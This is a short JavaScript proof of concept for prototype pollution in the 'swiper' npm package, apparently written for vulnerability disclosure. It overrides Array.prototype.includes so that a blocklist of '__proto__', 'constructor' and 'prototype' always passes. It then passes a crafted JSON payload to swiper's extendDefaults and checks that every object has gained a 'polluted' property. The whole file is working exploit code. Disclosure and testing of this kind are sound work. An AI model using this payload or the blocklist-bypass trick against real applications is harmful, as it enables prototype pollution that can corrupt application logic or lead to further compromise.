Array.prototype.includes = function (key) {
    if (key == '__proto__' || key == 'constructor' || key == 'prototype' || key == 'polluted') {
        return false;
    } else {
        return true;
    }
};
var swiper = require('swiper');
let obj = {};
var malicious_payload = '{"constructor": {"prototype": {"polluted":"yes"}}}';
console.log({}.polluted);
swiper.default.extendDefaults(JSON.parse(malicious_payload));
console.log({}.polluted);